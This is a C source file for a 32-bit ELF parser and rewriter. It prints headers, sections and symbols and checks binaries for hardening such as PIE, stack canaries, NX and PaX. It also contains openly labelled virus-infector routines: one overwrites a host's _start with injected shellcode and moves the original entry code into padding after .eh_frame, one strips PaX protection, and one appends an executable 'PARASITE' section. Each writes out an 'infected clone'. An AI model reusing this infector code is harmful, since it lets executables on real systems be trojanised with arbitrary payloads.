#include "elves.h"
#include <assert.h>
#include <error.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define $(Class, name, ...) Class##$##name(const Class * self, ##__VA_ARGS__)
#define $$(Class, name, ...) Class##$$##name(Class * self, ##__VA_ARGS__)
#define mkcase(c,e) case c##_##e: typestr = #e; break
#define dprintf(str, ...) printf("[%s:%s]"##str, __FILE__, __LINE__, ##__VA_ARGS__)
#define ElfObject$CLONE(ptr, fd, offset, size, fn) { fseek(fd, offset, SEEK_SET); fn(ptr, size, 1, fd); }

const char START[] = "\x31\xed\x5e\x89\xe1\x83\xe4\xf0\x50\x54\x52\xe8";
const char SPACE[] = "\x90\x90\x90\x90\x90\x90\x90";
const char PAD[] = "--------------------------------";

#define ElfObject$MAP(c, fd, offset, size) {\
    int i; char chr = c;\
    fseek(fd, offset, SEEK_SET);\
    for(i=0;i<size;i++)\
        fwrite(&chr, 1, 1, fd);\
}

/* [ph] - Program Headers ************************************************ {{ */
ElfElement *$(ElfObject, ph_new, int index) {
    ElfElement *e = malloc(sizeof(ElfElement));
    e->next = NULL;
    e->last = NULL;

    e->class = ElfPh;
    e->index = index;

    assert(e->index < self->ph_count);
    e->size = sizeof(Elf32_Phdr);
    assert(e->size == self->eh->e_phentsize);

    e->ph = malloc(e->size);
    e->offset = self->eh->e_phoff + e->index * self->eh->e_phentsize;
    ElfObject$CLONE(e->ph, self->fD, e->offset, e->size, fread);
    //assert(e->offset == e->ph->p_offset);
    //assert(e->size == e->ph->p_filesz);

    /* TODO: Rewriting the program header.
     * TODO: Move this into it's own method.
    if(e->ph->p_type == PT_LOAD) {
        e->ph->p_flags |= PF_R|PF_W|PF_X;
        fseek(self->fD, e->offset, SEEK_SET);
        printf("%p(%d) to %x\n", e->ph, sizeof(Elf32_Phdr), e->offset);
        int wrote = fwrite((Elf32_Phdr *)e->ph, sizeof(Elf32_Phdr), 1, self->fD);
        printf("Wrote %d (vs %d) bytes\n", wrote, sizeof(Elf32_Phdr));
    }
    */

    return e;
}
void ElfElement$ph_print(ElfElement *self) {
    Elf32_Phdr *ph = self->ph;

    char *typestr = NULL;
    switch(ph->p_type) {
        mkcase(PT, NULL);
        mkcase(PT, LOAD);
        mkcase(PT, DYNAMIC);
        mkcase(PT, INTERP);
        mkcase(PT, NOTE);
        mkcase(PT, SHLIB);
        mkcase(PT, PHDR);
        mkcase(PT, TLS);
        mkcase(PT, LOOS);
        mkcase(PT, HIOS);
        mkcase(PT, LOPROC);
        mkcase(PT, HIPROC);
        mkcase(PT, GNU_EH_FRAME);
        mkcase(PT, GNU_STACK);
        mkcase(PT, GNU_RELRO);
        mkcase(PT, PAX_FLAGS);
    };

    char perms[13];
    if(ph->p_type != PT_PAX_FLAGS) {
        char _perms[] = {
            ph->p_flags&PF_R ? 'r' : '-',
            ph->p_flags&PF_W ? 'w' : '-',
            ph->p_flags&PF_X ? 'x' : '-',
            0
        };
        memcpy(perms, _perms, sizeof(perms));
    } else {
        char _perms[] = {
            ph->p_flags & PF_PAGEEXEC    ? 'P' : '-',
            ph->p_flags & PF_NOPAGEEXEC  ? 'p' : '-',
            ph->p_flags & PF_SEGMEXEC    ? 'S' : '-',
            ph->p_flags & PF_NOSEGMEXEC  ? 's' : '-',
            ph->p_flags & PF_MPROTECT    ? 'M' : '-',
            ph->p_flags & PF_NOMPROTECT  ? 'm' : '-',
            '?', //ph->p_flags & PF_RANDEXEC    ? 'X' : '-',
            '?', //ph->p_flags & PF_NORANDEXEC  ? 'x' : '-',
            ph->p_flags & PF_EMUTRAMP    ? 'E' : '-',
            ph->p_flags & PF_NOEMUTRAMP  ? 'e' : '-',
            ph->p_flags & PF_RANDMMAP    ? 'R' : '-',
            ph->p_flags & PF_NORANDMMAP  ? 'r' : '-',
            0
        };
        memcpy(perms, _perms, sizeof(perms));
    }

    printf("ph [offset:%#06x type:%#010x[%10s] vaddr:%#06x paddr:%#06x"
        " filesz:%#08x memsz:%#08x flags:%06x[%12s] align:%#06x CONGRUENCY:%s]\n",
        ph->p_offset,
        ph->p_type, typestr,
        ph->p_vaddr,
        ph->p_paddr,
        ph->p_filesz,
        ph->p_memsz,
        ph->p_flags, perms,
        ph->p_align,
        (ph->p_vaddr % ELF_PAGESIZE == ph->p_offset % ELF_PAGESIZE) ? "PASS" : "FAIL"
    );
    //printf("\\___%08x to %08x\n", ph->p_offset, ph->p_offset+ph->p_filesz);
}
void $(ElfObject, ph_print) {
    printf("Program Header Entries: %i\n", self->ph_count);
    ElfElement *e = self->ph;
    do ElfElement$ph_print(e);
    while((e = e->next));
}

/* }} *************************************************************************/
/* [sh] - Section Headers ************************************************ {{ */
#define ElfObject$SH_RESOLVE_NAME(self, e) (self->shstrtab + e->sh->sh_name)
ElfElement *$(ElfObject, sh_new, int index) {
    ElfElement *e = malloc(sizeof(ElfElement));
    e->next = NULL;
    e->last = NULL;

    e->class = ElfSh;
    e->index = index;

    assert(e->index < self->sh_count);
    e->size = sizeof(Elf32_Shdr);
    assert(e->size == self->eh->e_shentsize);

    e->sh = malloc(e->size);
    e->offset = self->eh->e_shoff + e->index * self->eh->e_shentsize;
    ElfObject$CLONE(e->sh, self->fD, e->offset, e->size, fread);

    strncpy(e->name, ElfObject$SH_RESOLVE_NAME(self, e), sizeof(e->name));

    e->raw = NULL;
    if(e->sh->sh_size) {
        e->raw = malloc(sizeof(RawData));
        e->raw->offset = e->sh->sh_offset;
        e->raw->size = e->sh->sh_size;
        e->raw->body = malloc(e->raw->size);
        ElfObject$CLONE(e->raw->body, self->fD, e->raw->offset, e->raw->size, fread);
    }

    return e;
}

void $(ElfElement, sh_print) {
    Elf32_Shdr *sh = self->sh;
    char *typestr = NULL;
    switch(sh->sh_type) {
        mkcase(SHT, NULL);
        mkcase(SHT, PROGBITS);
        mkcase(SHT, SYMTAB);
        mkcase(SHT, STRTAB);
        mkcase(SHT, RELA);
        mkcase(SHT, HASH);
        mkcase(SHT, DYNAMIC);
        mkcase(SHT, NOTE);
        mkcase(SHT, NOBITS);
        mkcase(SHT, REL);
        mkcase(SHT, SHLIB);
        mkcase(SHT, DYNSYM);
        mkcase(SHT, LOPROC);
        mkcase(SHT, HIPROC);
        mkcase(SHT, LOUSER);
        mkcase(SHT, HIUSER);
    }
    printf(
        "sh [offset:%#06x type:%#010x[%10s] addr:%#06x size:%#06x link:%#04x"
        " info:%#04x addralign:%#04x entsize:%#04x flags:%#04x name:%#05x[%32s]]\n",
        sh->sh_offset,
        sh->sh_type, typestr,
        sh->sh_addr,
        sh->sh_size,
        sh->sh_link,
        sh->sh_info,
        sh->sh_addralign,
        sh->sh_entsize,
        sh->sh_flags,
        sh->sh_name, self->name
    );
}
void $(ElfObject, sh_print) {
    printf("Section Header Entries: %i\n", self->sh_count);
    ElfElement *e = self->sh;
    do ElfElement$sh_print(e);
    while((e = e->next));
}
/* }} *************************************************************************/
/* [ds] - Dynamic Symbols ************************************************ {{ */
#define ElfObject$DS_RESOLVE_NAME(self, e) ( self->dynstr + e->sh->sh_name )
ElfElement *$(ElfObject, ds_new, int index) {
    ElfElement *e = malloc(sizeof(ElfElement));
    e->next = NULL;
    e->last = NULL;

    e->class = ElfDs;
    e->index = index;

    assert(e->index < self->ds_count);
    e->size = sizeof(Elf32_Sym);

    e->ds = malloc(e->size);
    e->offset = self->dynsym->sh->sh_offset + e->index * e->size;

    ElfObject$CLONE(e->ds, self->fD, e->offset, e->size, fread);

    strncpy(e->name, ElfObject$DS_RESOLVE_NAME(self, e), sizeof(e->name));

    return e;
}
void ElfElement$ds_print(ElfElement *self) {
    Elf32_Sym *ds = self->ds;
    printf("ds [name:%#05x[%32s] value:%#06x size:%#05x info:%#04x other:%#04x shndx:%#06x]\n",
        ds->st_name, self->name,
        ds->st_value,
        ds->st_size,
        ds->st_info,
        ds->st_other,
        ds->st_shndx
    );
}
void $(ElfObject, ds_print) {
    printf("Dynamic Symbols Table Entries: %i\n", self->ds_count);
    ElfElement *e = self->ds;
    do ElfElement$ds_print(e);
    while((e = e->next));
}
/* }} *************************************************************************/
/* [st] - Static Symbols ************************************************* {{ */
#define ElfObject$ST_RESOLVE_NAME(self, e) ( self->strtab + e->sh->sh_name )
ElfElement *$(ElfObject, st_new, int index) {
    ElfElement *e = malloc(sizeof(ElfElement));
    e->next = NULL;
    e->last = NULL;

    e->class = ElfSt;
    e->index = index;

    assert(e->index < self->st_count);
    e->size = sizeof(Elf32_Sym);

    e->st = malloc(e->size);
    e->offset = self->symtab->sh->sh_offset + e->index * e->size;

    ElfObject$CLONE(e->st, self->fD, e->offset, e->size, fread);
    strncpy(e->name, ElfObject$ST_RESOLVE_NAME(self, e), sizeof(e->name));

    return e;
}
void ElfElement$st_print(ElfElement *self) {
    Elf32_Sym *st = self->st;
    printf("st [name:%#05x[%32s] value:%#06x size:%#05x info:%#04x other:%#04x shndx:%#06x]\n",
        st->st_name, self->name,
        st->st_value,
        st->st_size,
        st->st_info,
        st->st_other,
        st->st_shndx
    );
}
void $(ElfObject, st_print) {
    printf("Static Symbols Table Entries: %i\n", self->st_count);
    ElfElement *e = self->st;
    do ElfElement$st_print(e);
    while((e = e->next));
}
/* }} *************************************************************************/
/* [eh] - The ELF Header ************************************************* {{ */
void $(ElfObject, eh_print) {
    printf("ELF Header:\n");
    printf("eh [magic:"); {
        int i;
        for(i=0; i<16; i++)
            printf(" %02x", self->eh->e_ident[i]);
        printf("]\n");
    }
    printf(
        "eh [type:%#06x machine:%#06x version:%#010x entry:%#010x ehsize:%#06x flags:%#010x]\n",
        self->eh->e_type,
        self->eh->e_machine,
        self->eh->e_version,
        self->eh->e_entry,
        self->eh->e_ehsize,
        self->eh->e_flags
    );
    printf("eh [phoff:%#06x phentsize:%#06x phnum:%#06x]\n",
        self->eh->e_phoff,
        self->eh->e_phentsize,
        self->eh->e_phnum
    );
    printf("eh [shoff:%#06x shentsize:%#06x shnum:%#06x shstrndx:%#06x]\n",
        self->eh->e_shoff,
        self->eh->e_shentsize,
        self->eh->e_shnum,
        self->eh->e_shstrndx
    );
}

/* }} *************************************************************************/
/* [Interface] *********************************************************** {{ */
ElfObject *ElfObject$init(const char *elf_file);
ElfElement *$(ElfObject, sh_new, int index);
ElfElement *$(ElfObject, ph_new, int index);
ElfElement *$(ElfObject, st_new, int index);
/* }} *************************************************************************/
/* [Mutators] ************************************************************ {{ */
void $$(ElfElement, expand, size_t s) {
    switch(self->class) {
        case ElfPh:
            self->ph->p_memsz += s;
            self->ph->p_filesz += s;
        break;

        case ElfSh:
            self->sh->sh_size += s;
        break;
    }
}
void $$(ElfElement, shift, off_t o) {
    //self->offset += o;
    switch(self->class) {
        case ElfPh:
            printf("PH %x to %x PH\n",
                (void *)self->ph->p_offset,
                (void *)(self->ph->p_offset+o)
            );
            self->ph->p_offset += o;
            self->ph->p_vaddr += o;
            self->ph->p_paddr += o;
        break;

        case ElfSh:
            printf("SH %x to %x SH\n",
                (void *)self->sh->sh_offset,
                (void *)(self->sh->sh_offset+o)
            );
            self->sh->sh_offset += o;
            if(self->sh->sh_addr)
                self->sh->sh_addr += o;
        break;
    }
}

void $$(ElfObject, ph_expand, ElfElement *e, size_t bytes) {
    off_t ph_start = e->ph->p_offset;
    off_t ph_end   = e->ph->p_offset + e->ph->p_memsz;
    printf("!!! %p to %p->%p !!!\n", ph_start, ph_end, (ph_end+bytes));

    ElfElement *phe = self->ph;
    do {
        if(phe->ph->p_offset == ph_start) {
            ElfElement$$expand(phe, bytes);
        } else if(phe->ph->p_offset >= ph_end) {
            ElfElement$$shift(phe, bytes);
            assert(phe->raw == NULL);
        }
    } while((phe = phe->next));

    ElfElement *she = self->sh;
    do {
        if(she->sh->sh_type != SHT_NULL) {
            if(she->sh->sh_offset >= ph_end) {
                if(self->entry == she->sh->sh_offset) {
                    self->entry += bytes;
                    self->eh->e_entry += bytes;
                }
                ElfElement$$shift(she, bytes);
            }
            if(she->raw) {
                printf("shift!\n");
                if(she->raw->offset >= ph_end)
                    she->raw->offset += bytes;
            }
        }
    } while((she = she->next));

/*
    int phi = 0;
    phe = self->ph;
    do {
        printf(
            "ph%d: %#010x to %#010x\n",
            phi, phe->ph->p_offset,
            phe->ph->p_offset + phe->ph->p_memsz
        );
        she = self->sh->next;
        do {
            int a = she->sh->sh_offset >= phe->ph->p_offset;
            int b = she->sh->sh_offset + she->sh->sh_size <= phe->ph->p_offset + phe->ph->p_memsz;
            if(a && b )
                printf(
                    " \\___sh: %#010x to %#010x %s\n",
                    she->sh->sh_offset,
                    she->sh->sh_offset + she->sh->sh_size,
                    she->name
                );
        } while((she = she->next));
        phi++;
    } while((phe = phe->next));
*/
}
/*
void $$(ElfObject, sh_resize, ElfElement *e, Elf32_Size size) {
    assert(e->class == ElfSh);

    e->sh->sh_offset = 0x2000;
    e->sh->sh_addr = 0x3000;
    e->sh->sh_link = 0x000;
    e->sh->sh_entsize = 0;
    e->sh->sh_size = 0;
    e->raw = NULL;
    e->offset = self->eh->e_shoff + e->index * self->eh->e_shentsize;
}
*/
void RawData$free(RawData **self) {
    if((*self)->body) free((*self)->body);
    (*self)->body = NULL;
    (*self)->size = 0;
    (*self)->offset = 0;
    free(*self);
    (*self) = NULL;
}

void ElfElement$free(ElfElement **self) {
    if((*self)->raw) RawData$free(&(*self)->raw);

    switch((*self)->class) {
        case ElfSh: free((*self)->sh); (*self)->sh = NULL; break;
        case ElfPh: free((*self)->ph); (*self)->ph = NULL; break;
        case ElfSt: free((*self)->st); (*self)->st = NULL; break;
        case ElfDs: free((*self)->ds); (*self)->ds = NULL; break;
        case ElfEh: break;
    }

    if((*self)->last && (*self)->next) {
        (*self)->last->next = (*self)->next->last;
        (*self)->next->last = (*self)->last->next;
    } else if((*self)->next) {
        (*self)->next->last = NULL;
    } else if((*self)->last) {
        (*self)->last->next = NULL;
    }

    free(*self);
    (*self) = NULL;
}


ElfObject *ElfObject$init(const char *fN) {
    ElfObject *self = malloc(sizeof(ElfObject));
    if((self->fD = fopen(fN, "rb"))) {
        self->class = ElfEh;

        self->eh = malloc(sizeof(Elf32_Ehdr));
        ElfObject$CLONE(self->eh, self->fD, 0, sizeof(Elf32_Ehdr), fread);
        self->size = self->eh->e_ehsize;

        char magic[5];
        memcpy(magic, self->eh->e_ident, 4);
        if(memcmp(magic, "\177ELF", 4) == 0) {
            assert(self->size == self->eh->e_ehsize);
            assert(self->eh->e_ident[EI_CLASS] == ELFCLASS32);

            self->entry = self->eh->e_entry; //. The location of _start

            int i;
            ElfElement *eptr = NULL;

            //. Program Headers
            self->ph = NULL;
            self->ph_count = self->eh->e_phnum;
            for(i=0; i<self->ph_count; i++) {
                if(i > 0) {
                    eptr->next = ElfObject$ph_new(self, i);
                    eptr->next->last = eptr;
                    eptr = eptr->next;
                } else {
                    eptr = ElfObject$ph_new(self, i);
                    self->ph = eptr;
                }
            }

            //. Section Names String Buffer
            Elf32_Off offset = self->eh->e_shoff + self->eh->e_shstrndx * self->eh->e_shentsize;
            Elf32_Shdr ndx;
            ElfObject$CLONE(&ndx, self->fD, offset, sizeof(Elf32_Shdr), fread);
            self->shstrtab = malloc(ndx.sh_size);
            ElfObject$CLONE(self->shstrtab, self->fD, ndx.sh_offset, ndx.sh_size, fread);

            //. Section Headers
            self->sh = NULL;
            self->sh_count = self->eh->e_shnum;
            for(i=0; i<self->sh_count; i++) {
                if(i > 0) {
                    eptr->next = ElfObject$sh_new(self, i);
                    eptr->next->last = eptr;
                    eptr = eptr->next;
                } else {
                    eptr = ElfObject$sh_new(self, i);
                    self->sh = eptr;
                }

                if(eptr->sh->sh_type == SHT_DYNAMIC) {
                    self->dynamic = eptr;
                } else if(eptr->sh->sh_type == SHT_SYMTAB) {
                    self->symtab = eptr;
                } else if(eptr->sh->sh_type == SHT_DYNSYM) {
                    self->dynsym = eptr;
                } else if(eptr->sh->sh_type == SHT_STRTAB) {
                    char *name = ElfObject$SH_RESOLVE_NAME(self, eptr);
                    char **ptr = NULL;
                    if(strncmp(name, ".strtab", 7) == 0) {
                        ptr = &self->strtab;
                    } else if(strncmp(name, ".dynstr", 7) == 0) {
                        ptr = &self->dynstr;
                    } else if(strncmp(name, ".shstrtab", 9) == 0) {
                        assert(self->shstrtab != NULL);
                    } else {
                        printf("ERROR!\n");
                    }

                    if(ptr != NULL) {
                        *ptr = malloc(eptr->sh->sh_size);
                        ElfObject$CLONE(*ptr, self->fD, eptr->sh->sh_offset, eptr->sh->sh_size, fread);
                    }
                }
            }

            //. Static Symbol Table
            assert(self->symtab != NULL);
            self->st = NULL;
            self->st_count = self->symtab->sh->sh_size/sizeof(Elf32_Sym);
            self->st_offset = self->symtab->sh->sh_offset;
            for(i=0; i<self->st_count; i++) {
                if(i > 0) {
                    eptr->next = ElfObject$st_new(self, i);
                    eptr->next->last = eptr;
                    eptr = eptr->next;
                } else {
                    eptr = ElfObject$st_new(self, i);
                    self->st = eptr;
                }
            }

            //. Dynamic Symbol Table
            assert(self->dynsym != NULL);
            self->ds = NULL;
            self->ds_count = self->dynsym->sh->sh_size/sizeof(Elf32_Sym);
            self->ds_offset = self->dynsym->sh->sh_offset;
            for(i=0; i<self->ds_count; i++) {
                if(i > 0) {
                    eptr->next = ElfObject$ds_new(self, i);
                    eptr->next->last = eptr;
                    eptr = eptr->next;
                } else {
                    eptr = ElfObject$ds_new(self, i);
                    self->ds = eptr;
                }
            }
        } else {
            free(self);
            self = NULL;
        }
    }
    return self;
}
ElfElement *$(ElfObject, find_section, const char *section_name) {
    printf(" \\___Finding the %s section...", section_name);
    ElfElement *e = self->sh;
    while(e && strcmp(ElfObject$SH_RESOLVE_NAME(self, e), section_name))
        e = e->next;
    e ? printf("Done\n") : printf("Failed\n");
    return e;
}

void $(ElfObject, write_shellcode, const char *section_name, const char *shellcode, int size) {
    ElfElement *e = ElfObject$find_section(self, section_name);
    if(e) {
        printf("     \\___Rewriting _start...");
        char *buffer = e->raw->body;
        int i;
        for(i=0; i<size; i++) {
            buffer[i] = shellcode[i];
            printf("%02x", 0xff&buffer[i]);
        }
        printf("...Done\n");
    }
}

RawData *$(ElfObject, extract_start) {
    ElfElement *e;
    e = ElfObject$find_section(self, ".text");

    char *ptr1, *ptr2;

    printf(" \\___Assessing immunity of host file..."); {
        ptr1 = (char *)e->raw->body;
        ptr2 = (char *)START;
        int i;
        for(i=0; i<strlen(START); i++)
            if(*ptr1++ != *ptr2++)
                break;
        if(i == strlen(START)) {
            printf("Vulnerable\n");
        } else {
            printf("Immune\n");
            e = NULL;
        }
    }

    RawData *rD = NULL;
    if(e) {
        ptr2 = ptr1;
        while(*(ptr2) != '\x90') ptr2++;
        while(*(ptr2) == '\x90') ptr2++;

        ptr1 = (char *)e->raw->body;

        rD = malloc(sizeof(RawData));
        rD->offset = -1;
        rD->size = ptr2 - ptr1;
        rD->body = malloc(rD->size);

        int i;
        char *c;
        char *b = rD->body;
        for(i=0, c=ptr1; c<ptr2; i++, c++) b[i] = *c;
    }
    return rD;
}

void $(ElfObject, shelve_code, RawData *rD) {
    ElfElement *e = ElfObject$find_section(self, ".eh_frame");

    //. Calculating injection area...
    int size = -1;
    char *ptr1, *ptr2;
    printf("     \\___Calculating Target Area..."); {
        ptr1 = (void *)(e->sh->sh_offset + e->sh->sh_size);
        ptr2 = (void *)(e->next->sh->sh_offset);
        size = ptr2 - ptr1;
    } printf("Done [%p to %p (%d bytes)]\n", ptr1, ptr2, size);

    printf(
        "     \\___Shelving %d bytes into %d-byte fissure (section %s)...",
        rD->size,
        size,
        ElfObject$SH_RESOLVE_NAME(self, e)
    ); {
        char *buffer = e->raw->body;
        int oldsize = e->raw->size;
        //e->sh->sh_size += ptr2 - ptr1; //. Not required :)
        e->raw->size += ptr2 - ptr1;
        e->raw->body = malloc(e->raw->size);
        memcpy(e->raw->body, buffer, oldsize);
        free(buffer);

        //. Write!
        char *dst = e->raw->body + oldsize;
        char *src = rD->body;
        int i;
        for(i=0; i<rD->size; i++)
            dst[i] = src[i];
    }; printf("Done\n");
}

void $(ElfObject, chpax) {
    self->eh->e_ident[0xe] = '-'; //. chpax -spermx
}

void $(ElfObject, rewrite_entry, const char *shellcode, int size) {
    RawData *start = ElfObject$extract_start(self);
    if(start) {
        ElfObject$write_shellcode(self, ".text", shellcode, size);
        ElfObject$shelve_code(self, start);
        printf("Memory of clone infected with germ.\n");
    }
}


void $(ElfObject, clone, const char *fNC) {
    printf("Committing infected clone to %s...\n", fNC);
    FILE *fD = fopen(fNC, "wb");
    FILE *fDM = fopen("/tmp/map", "wb");

    /*
    fseek(fD, 0, SEEK_SET);
    int i, s = sizeof PAD - 1;
    for(i=0; i<0x200; i++) {
        fwrite(PAD, s, 1, fD);
        fwrite(PAD, s, 1, fDM);
    }
    */

    ElfObject$MAP('E', fDM, 0, sizeof(Elf32_Ehdr));
    ElfObject$CLONE(self->eh, fD, 0, sizeof(Elf32_Ehdr), fwrite);
    printf(" \\___Wrote ELF Header\n");

    ElfElement *e;

    e = self->ph;
    do {
        ElfObject$CLONE(e->ph, fD, e->offset, sizeof(Elf32_Phdr), fwrite)
        ElfObject$MAP('P', fDM, e->offset, sizeof(Elf32_Phdr))
    } while((e = e->next));
    printf(" \\___Wrote Program Headers\n");

    e = self->sh;
    char mc;
    do {
        mc = 'S';
        if(e->sh->sh_type == SHT_PROGBITS)
            if(strcmp(e->name, ".text") == 0)
                mc = 'T';
            else if(strcmp(e->name, ".rodata") == 0)
                mc = 'R';
            else if(strcmp(e->name, ".data") == 0)
                mc = 'D';
            else if(strcmp(e->name, ".got") == 0)
                mc = 'G';
            else
                mc = 'X';
        else if(e->sh->sh_type == SHT_HASH)
            mc = 'H';
        else if(e->sh->sh_type == SHT_STRTAB)
            mc = 'Z';
        else if(e->sh->sh_type == SHT_NOBITS)
            mc = 'B';

        ElfObject$CLONE(e->sh, fD, e->offset, sizeof(Elf32_Shdr), fwrite);
        ElfObject$MAP(mc+32, fDM, e->offset, sizeof(Elf32_Shdr));
        if(e->raw != NULL) {
            ElfObject$CLONE(e->raw->body, fD, e->raw->offset, e->raw->size, fwrite);
            ElfObject$MAP(mc, fDM, e->raw->offset, e->raw->size);
        }
    } while((e = e->next));
    printf(" \\___Wrote Section Headers\n");

    fclose(fD);
    fclose(fDM);
}

ElfElement *$$(ElfObject, sh_append) {
    ElfElement *e = malloc(sizeof(ElfElement));

    //. We're adding a new ElfElement of class ElfSh (Section Header)
    e->class = ElfSh;
    e->size = sizeof(Elf32_Shdr);

    //. Find the last element in the linked list of ElfSh elements
    e->next = NULL;
    for(e->last=self->sh; e->last->next; e->last = e->last->next);
    e->last->next = e;

    //. Reflect the new ElfSh in the ElfObject
    e->index = self->sh_count;
    e->offset = self->eh->e_shoff + e->index * self->eh->e_shentsize;

    char payload[] = "\xccPARASITE";
    e->sh = malloc(e->size); {
        e->sh->sh_type = SHT_PROGBITS;
        e->sh->sh_flags = SHF_WRITE|SHF_ALLOC|SHF_EXECINSTR;
        e->sh->sh_offset = 0x2000;  //. FIXME
        e->sh->sh_addr = 0x3000;    //. FIXME
        e->sh->sh_link = 0;
        e->sh->sh_info = 0;
        e->sh->sh_addralign = 0x1;
        e->sh->sh_name = 0;
        e->sh->sh_entsize = 0x1000; //. FIXME
        e->sh->sh_size = strlen(payload+1);
        e->raw = malloc(sizeof(RawData));
        e->raw->offset = e->sh->sh_offset;
        e->raw->size = strlen(payload+1);
        e->raw->body = malloc(e->raw->size);
        memcpy(e->raw->body, payload, e->raw->size);
        ElfElement$sh_print(e);
    }

    //. Reflect the new ElfSh in the ELF header
    self->sh_count++;
    self->eh->e_shnum++;

    return e;
}

/* }} *************************************************************************/
/* [Utilities] *********************************************************** {{ */
int $(ElfObject, chk_pax) {
    int paxed = 0;
    ElfElement *e = self->ph;
    do {
        if(e->ph->p_type == PT_PAX_FLAGS) {
            if(((e->ph->p_flags & PF_PAGEEXEC) && (e->ph->p_flags & PF_NOPAGEEXEC)) ||
               ((e->ph->p_flags & PF_SEGMEXEC) && (e->ph->p_flags & PF_NOSEGMEXEC)) ||
               ((e->ph->p_flags & PF_EMUTRAMP) && (e->ph->p_flags & PF_NOEMUTRAMP)) ||
               ((e->ph->p_flags & PF_MPROTECT) && (e->ph->p_flags & PF_NOMPROTECT)) ||
               ((e->ph->p_flags & PF_RANDMMAP) && (e->ph->p_flags & PF_NORANDMMAP))
            ) printf("-EINVAL due to bad flags on PT_PAX_FLAGS binary\n");
            else paxed = 1;
        }
    } while((e=e->next));
    return paxed;
}

void $(ElfObject, chk_sec) {
    int pie = (self->eh->e_type == ET_DYN);
    if(pie) {
        //FIXME
    }
    ElfElement *e;

    int stack_chk_fail = -1;
    e = self->st;
    do stack_chk_fail = strncmp(
        ElfObject$ST_RESOLVE_NAME(self, e),
        "__stack_chk_fail",
        16
    ); while((e=e->next) && stack_chk_fail == -1);

    int noexecbit = -1;
    e = self->ph;
    do if(e->ph->p_type == PT_GNU_STACK)
        noexecbit = ((e->ph->p_flags&PF_X) == 0);
    while((e=e->next) && noexecbit == -1);

    printf("PIE         : %s\n", pie ? "FAIL" : "PASS");
    printf("Stack Canary: %s\n", stack_chk_fail ? "PASS" : "FAIL");
    printf("NX-Bit Set  : %s\n", noexecbit ? "PASS" : "FAIL");
    printf("PT_PAX_FLAGS: %s\n", ElfObject$chk_pax(self) ? "PASS" : "FAIL");
}
/* }} *************************************************************************/
int main(int argc, char *argv[]) {
    int e = 1;
    if(argc == 2) {
        const char *fN = argv[1];
        ElfObject *elf = ElfObject$init(fN);

        //ElfObject$$sh_append(elf);

        //ElfObject$eh_print(elf);
        //ElfObject$ph_print(elf);
        ElfObject$sh_print(elf);
        ElfObject$$ph_expand(elf, elf->ph->next, 0x10);
        ElfObject$sh_print(elf);
        //ElfObject$ds_print(elf);
        //ElfObject$st_print(elf);
        //ElfObject$chk_sec(elf);

/*
#include "pl_shuriken.h"
        ElfObject$rewrite_entry(elf, pl_shuriken, pl_shuriken_len);

        ElfObject$chpax(elf);
*/
        /* write amended in-memory elf to clone */ {
            char fNC[strlen(fN)+5];
            memcpy(fNC, fN, strlen(fN));
            memcpy(fNC+strlen(fN), ".cln", 5);
            ElfObject$clone(elf, fNC);
        }

        fclose(elf->fD);
        e=0;
    }
    return e;
}
